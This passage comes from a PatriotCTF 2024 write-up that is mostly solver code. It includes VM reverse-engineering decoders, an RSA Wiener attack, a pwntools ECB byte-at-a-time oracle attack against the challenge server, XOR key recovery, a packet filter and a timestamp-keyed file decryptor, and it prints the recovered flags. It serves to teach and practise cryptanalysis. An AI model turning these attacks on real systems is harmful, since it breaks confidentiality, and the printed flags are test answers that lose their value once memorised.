 fseek(f, 0, 2);
 int len = ftell(f);
 fseek(f, 0, 0);
 char buffer[2048] = { 0 };
 fread(buffer, 1, len, f);

 for (int i = 0; i < len;) {
 i++;
 char tmp = 0;
 for (int j = 0; j < 8; j++) {
 tmp += buffer[i + j];
 }
 printf("%c", tmp);
 i += 8;
 i += 2;
 }

 return 0;
}
//pctf{nest3d_vm_s3cr3ts}
```



```
int main() {
 FILE* f = fopen("E:\oj\2024CTFWXX\2024PatriotCTF\Notanothervmreversingproblem\not_another_vm.prog", "rb");
 fseek(f, 0, 2);
 fseek(f, 0, 2);
 int len = ftell(f);
 fseek(f, 0, 0);
 char buffer[2048] = { 0 };
 fread(buffer, 1, len, f);

 for (int i = 0; i < 30; i++) {
 int tmp = buffer[i * 16];
 int temp = buffer[i * 16 + 4];
 printf("%c", temp - tmp);
 }

 return 0;
}
//pctf{th1s_vm_pr0blem_was_e4sy}
```



```
result=[0xa5,0x39,0x24,0x90,0xa8,0xa5,0x88,0x77,0x26,0xe4,0x3c,0x14,0x03,0x1e,0xba,0x3c,0x7d,0xbb,0xdc,0xd6,0xaa,0x90,0x50,0xc9,0x0f,0xaa,0xdd,0x57,0x33,0xe1,0xa4,0xc7]

def func(s1,s2):
    s3=[0]*4
    for i in range(2):
        for j in range(2):
            s3[2*i+j]=0
            for k in range(2):
                s3[2*i+j]+=s1[2*i+k]*s2[2*k+j]
    return abs(s3[0]*s3[3]-s3[1]*s3[2])

s="0123456789_{}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
for i in range(len(result)):
    print()
    s1=[48,48,48,i]
    s2=[0xa9,i,48,0xd1]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('0',end=' ')
        #continue
    s1=[49,i,66,i]
    s2=[111,i,49,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('1',end=' ')
        #continue
    s1=[50,50,i,0xaf]
    s2=[18,121,0xfc,50]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('2',end=' ')
        #continue
    s1=[i,0xcd,44,i]
    s2=[51,0x44,0x49,0x37]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('3',end=' ')
        #continue
    s1=[17,0xc9,52,i]
    s2=[0xc9,107,0xc9,52]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('4',end=' ')
        #continue
    s1=[12,i,46,0xda]
    s2=[53,0xea,53,0xb9]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('5',end=' ')
        #continue
    s1=[0xbd,i,25,54]
    s2=[51,i,i,54]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('6',end=' ')
        #continue
    s1=[55,0x85,0xae,80]
    s2=[0x44,0x3c,55,0xc4]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('7',end=' ')
        #continue
    s1=[i,54,i,43]
    s2=[56,0x99,56,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('8',end=' ')
        #continue
    s1=[57,57,57,70]
    s2=[0x9f,i,i,0xd5]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('9',end=' ')
        #continue
    s1=[95,0xda,0x8b,i]
    s2=[95,0xc4,i,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('_',end=' ')
        #continue
    s1=[123,0xe2,i,i]
    s2=[0xa3,123,0xc7,0xa2]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('{',end=' ')
        #continue
    s1=[i,40,0xc4,125]
    s2=[125,30,i,125]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('}',end=' ')
        #continue
    s1=[i,0xe6,i,i]
    s2=[97,97,i,0x93]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('a',end=' ')
        #continue
    s1=[98,i,i,98]
    s2=[0xf2,87,2,87]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('b',end=' ')
        #continue
    s1=[99,i,38,0xc8]
    s2=[i,0x8e,i,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('c',end=' ')
        #continue
    s1=[116,100,i,100]
    s2=[0xf8,53,0xd9,100]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('d',end=' ')
        #continue
    s1=[101,0x9c,i,16]
    s2=[0x69,0x2c,101,0x98]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('e',end=' ')
        #continue
    s1=[0x97,82,i,0xb3]
    s2=[i,i,21,0xc5]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('f',end=' ')
        #continue
    s1=[0xa6,0xe4,i,i]
    s2=[0xf2,0x2b,i,103]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('g',end=' ')
        #continue
    s1=[104,i,0x68,0x53]
    s2=[25,104,0xad,15]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('h',end=' ')
        #continue
    s1=[105,0xa0,109,0xa3]
    s2=[0xc6,0xc9,80,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('i',end=' ')
        #continue
    s1=[0xfb,i,i,i]
    s2=[60,0xe8,106,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('j',end=' ')
        #continue
    s1=[0xc6,75,0x8b,107]
    s2=[0x4b,0x45,107,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('k',end=' ')
        #continue
    s1=[28,0xfa,117,108]
    s2=[0,60,i,108]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('l',end=' ')
        #continue
    s1=[0x9f,i,i,39]
    s2=[7,109,109,109]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('m',end=' ')
        #continue
    s1=[0xd,0x5b,110,i]
    s2=[0x39,0x36,i,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('n',end=' ')
        #continue
    s1=[i,12,0xbc,75]
    s2=[0xb1,i,0xc2,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('o',end=' ')
        #continue
    s1=[0xc1,0xa1,0xe3,0xe4]
    s2=[90,i,82,0xbe]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('p',end=' ')
        #continue
    s1=[i,i,106,113]
    s2=[20,113,113,52]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('q',end=' ')
        #continue
    s1=[i,114,114,0xdd]
    s2=[114,25,114,105]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('r',end=' ')
        #continue
    s1=[27,i,0x27,0]
    s2=[63,i,i,41]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('s',end=' ')
        #continue
    s1=[i,84,i,91]
    s2=[i,116,0xda,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('t',end=' ')
        #continue
    s1=[117,33,0x95,0xe9]
    s2=[117,0x94,110,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('u',end=' ')
        #continue
    s1=[0xa7,0xce,i,118,]
    s2=[0x8b,118,i,71]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('v',end=' ')
        #continue
    s1=[119,0xa7,119,119]
    s2=[0xdd,i,87,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('w',end=' ')
        #continue
    s1=[120,111,0x94,0x9b]
    s2=[0x9a,0xd1,0xa7,44]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('x',end=' ')
        #continue
    s1=[2,0xf2,126,0xcc]
    s2=[56,121,121,64]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('y',end=' ')
        #continue
    s1=[i,i,0xcc,122]
    s2=[i,92,0xbd,0xdd]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('z',end=' ')
        #continue
    s1=[0x3a,0x66,65,65]
    s2=[0xf8,65,65,65]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('A',end=' ')
        #continue
    s1=[44,i,66,66]
    s2=[66,66,91,66]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('B',end=' ')
        #continue
    s1=[0x23,0x33,i,i]
    s2=[67,0x8f,i,67]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('C',end=' ')
        #continue
    s1=[0xad,21,75,i]
    s2=[i,i,0xc2,68]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('D',end=' ')
        #continue
    s1=[0xd4,i,0x82,i]
    s2=[i,i,i,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('E',end=' ')
        #continue
    s1=[0xb6,70,0x84,70]
    s2=[78,70,70,70]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('F',end=' ')
        #continue
    s1=[108,0xbe,71,0x84]
    s2=[102,0x85,i,124]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('G',end=' ')
        #continue
    s1=[0x9c,72,17,95]
    s2=[i,i,72,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('H',end=' ')
        #continue
    s1=[i,31,63,0x9c]
    s2=[i,104,0xf0,0xed]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('I',end=' ')
        #continue
    s1=[0x45,0x38,0x1b,0x9d]
    s2=[0x1b,0x2e,74,74]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('J',end=' ')
        #continue
    s1=[0xfd,75,75,75]
    s2=[75,75,i,0xb7]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('K',end=' ')
        #continue
    s1=[0x20,0x66,i,0xea]
    s2=[i,i,i,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('L',end=' ')
        #continue
    s1=[73,4,i,77]
    s2=[0xef,0xbb,77,77]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('M',end=' ')
        #continue
    s1=[i,71,78,i]
    s2=[0xb5,1,78,28]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('N',end=' ')
        #continue
    s1=[79,i,0x71,0x32]
    s2=[0xe3,i,79,13]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('O',end=' ')
        #continue
    s1=[0xed,i,i,27]
    s2=[80,80,0xbc,80]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('P',end=' ')
        #continue
    s1=[i,36,i,i]
    s2=[i,0xf0,0xbf,81]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('Q',end=' ')
        #continue
    s1=[82,i,i,i]
    s2=[0xa7,82,i,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('R',end=' ')
        #continue
    s1=[32,83,i,108]
    s2=[0x94,111,83,0xfb]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('S',end=' ')
        #continue
    s1=[0xe8,84,i,84]
    s2=[84,0xad,0xe0,110]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('T',end=' ')
        #continue
    s1=[i,70,114,0xeb]
    s2=[85,34,0xdb,0xc5]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('U',end=' ')
        #continue
    s1=[i,97,17,0xe8]
    s2=[i,35,0x8e,11]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('V',end=' ')
        #continue
    s1=[87,51,69,0x87]
    s2=[i,0xcc,87,87]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('W',end=' ')
        #continue
    s1=[88,i,107,88]
    s2=[88,88,i,117]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('X',end=' ')
        #continue
    s1=[41,0xcf,89,0x81]
    s2=[32,89,86,0xe8]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('Y',end=' ')
        #continue
    s1=[0x98,99,90,77]
    s2=[0xaf,0x8f,90,0xab]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('0',end=' ')
        #continue
    s1=" !#$%&'()*+,-./:;<=>?@[]^_`{|}~"
    for c in s1:
        tmp=(ord(c)*i)%255
        if tmp==result[i]:
            print(c,end=' ')
#pctf{d33p_le@rnING}
```



```
import base64
srt_key = 'secretkey'
enc = base64.b64decode("QRVWUFdWEUpdXEVGCF8DVEoYEEIBBlEAE0dQAURFD1I=")
res = []
res_rsv = []
for i in range(0,len(enc),2):
    enc_p1 = enc[i]
    enc_p2 = enc[i+1]
    c1 = chr(enc_p1 ^ ord(srt_key[(i//2) % len(srt_key)]))
    c2 = chr(enc_p2 ^ ord(srt_key[(i//2) % len(srt_key)]))
    res.append(c1)
    res_rsv.append(c2)

print("pctf{"+"".join(res)+"".join(res_rsv[::-1])+"}")
```



```
import gmpy2
import libnum

def continuedFra(x, y):
    cf = []
    while y:
        cf.append(x // y)
        x, y = y, x % y
    return cf

def gradualFra(cf):
    numerator = 0
    denominator = 1
    for x in cf[::-1]:
        numerator, denominator = denominator, x * denominator + numerator
    return numerator, denominator

def solve_pq(a, b, c):
    par = gmpy2.isqrt(b * b - 4 * a * c)
    return (-b + par) // (2 * a), (-b - par) // (2 * a)

def getGradualFra(cf):
    gf = []
    for i in range(1, len(cf) + 1):
        gf.append(gradualFra(cf[:i]))
    return gf

def wienerAttack(e, n):
    cf = continuedFra(e, n)
    gf = getGradualFra(cf)
    for d, k in gf:
        if k == 0: continue
        if (e * d - 1) % k != 0:
            continue
        phi = (e * d - 1) // k
        p, q = solve_pq(1, n - phi + 1, n)
        if p * q == n:
            return d

N = 0xa0d9f425fe1246c25b8c3708b9f6d7747dd5b5e7f79719831c5cbe19fb7bab66ed62719b3fc6090120d2cfe1410583190cd650c32a4151550732b0fc97130e5f02aa26cb829600b6ab452b5b11373ec69d4eaae6c392d92da8bcbea85344af9d4699e36fdca075d33f58049fd0a9f6919f3003512a261a00985dc3d9843a822974df30b81732a91ce706c44bde5ff48491a45a5fa8d5d73bba5022af803ab7bd85250e71fc0254fcf078d21eaa5d38724014a85f679e8a7a1aad6ed22602465f90e6dd8ef95df287628832850af7e3628ad09ff90a6dbdf7a0e6d74f508d2a6235d4eae5a828ac95558bbdf72f39af5641dfe3edb0cdaab362805d926106e2af
e = 0x5af5dbe4af4005564908a094e0eabb0a921b7482483a753e2a4d560700cb2b2dc9399b608334e05140f54d90fcbef70cec097e3f75395d0c4799d9ec3e670aca41da0892a7b3d038acb7a518be1ced8d5224354ce39e465450c12be653639a8215afb1ba70b1f8f71fc1a0549853998e2337604fca7edac67dd1e7ddeb897308ebf26ade781710e6a2fe4c533a584566ea42068d0452c1b1ecef00a781b6d31fbab893de0c9e46fce69c71cefad3119e8ceebdab25726a96aaf02a7c4a6a38d2f75f413f89064fef14fbd5762599ca8eb3737122374c5e34a7422ea1b3d7c43a110d3209e1c5e23e4eece9e964da2c447c9e5e1c8a6038dc52d699f9324fd6b9
c = 0x731ceb0ac8f10c8ff82450b61b414c4f7265ccf9f73b8e238cc7265f83c635575a9381aa625044bde7b34ad7cce901fe7512c934b7f6729584d2a77c47e8422c8c0fe2d3dd12aceda8ef904ad5896b971f8b79048e3e2f99f600bf6bac6cad32f922899c00fdc2d21fcf3d0093216bfc5829f02c08ba5e534379cc9118c347763567251c0fe57c92efe0a96c8595bac2c759837211aac914ea3b62aae096ebb8cb384c481b086e660f0c6249c9574289fe91b683609154c066de7a94eafa749c9e92d83a9d473cc88accd9d4c5754ccdbc5aa77ba9a790bc512404a81fc566df42b652a55b9b8ffb189f734d1c007b6cbdb67e14399182016843e27e6d4e5fca

d = wienerAttack(e, N)
m = pow(c, d, N)
print(libnum.n2s(m))
```



```
from pwn import *

io = remote("chal.competitivecyber.club",6001)

flag = b"pctf{"
for i in range(16):
    io.sendlineafter(b"> ",b"a"*(15-len(flag)))
    io.recvuntil(b"> ")
    enc = io.recv(32)
    for j in range(32,127):
        io.sendlineafter(b"> ",b"a"*(15-len(flag))+flag+int.to_bytes(j))
        io.recvuntil(b"> ")
        try_enc = io.recv(32)
        if try_enc == enc:
            flag += int.to_bytes(j)
            print(flag)
            break
```



```
from Crypto.Util.number import *
data = open("out.txt","r").read().replace("n","")
res = [[0]*16]*(len(data)//32)
for i in range(0,len(data),32):
    res[i//32] = [int(data[i:i+32][j:j+2],16) for j in range(0,len(data[i:i+32]),2)]

kj = set(range(32,127)) | set((10,))

key = 0
for idx in range(15):
    pos1 = [i[idx] for i in res]
    for i in range(0,256):
        try_set = set([i^j for j in pos1])
        if try_set.issubset(kj):
            key = (key << 8) + i

key = key << 8
iv = 0
res = b""
for i in range(0,len(data),32):
    chunk = int(data[i:i+32],16)
    iv = (iv+1) % 255
    curr_k = key+iv
    decoded = chunk ^ curr_k
    res += long_to_bytes(decoded)

print(res)
```



```
ip.src == 10.151.198.69 and not quic and tcp.port == 22993
```



```
import time
import math
import sys

def decrypt(encrypt_bytes, current_time):
    key_bytes = str(current_time).encode('utf-8')
    init_key_len = len(key_bytes)
    data_bytes_len = len(encrypt_bytes)
    
    # Adjust key length to match the length of encrypted data
    temp1 = data_bytes_len // init_key_len
    temp2 = data_bytes_len % init_key_len
    key_bytes *= temp1
    key_bytes += key_bytes[:temp2]
    
    # Decrypt by XORing again with the same key
    decrypted_bytes = bytes((a ^ b for a, b in zip(key_bytes, encrypt_bytes)))
    return decrypted_bytes

def main():
    # Read the encrypted file (first argument)
    encrypted_file = sys.argv[1]
    
    # Use the timestamp as used during encryption (passed as second argument or calculate it)
    if len(sys.argv) > 2:
        current_time = int(sys.argv[2])  # Use provided time
    else:
        current_time = math.floor(time.time())  # Fallback to current time
    
    # Read the encrypted data
    with open(encrypted_file, 'rb') as f:
        encrypted_data = f.read()

    # Decrypt the data
    decrypted_data = decrypt(encrypted_data, current_time)
    
    # Save the decrypted file
    output_file = 'decrypted_output.bin'
    with open(output_file, 'wb') as f:
        f.write(decrypted_data)

    print(f"Decrypted data written to {output_file}")

if __name__ == '__main__':
    main()
```



```
python3 decrypt.py encrypted_whole.bin 1726595769 
file encrypted_whole.bin
mv encrypted_whole.bin encrypted_whole.jpg
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/10-1727097159.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/3-1727097159.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/6-1727097160.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/6-1727097161.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/1-1727097161.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/2-1727097162.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/1-1727097162.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/5-1727097163.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/6-1727097164.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/1-1727097164.png)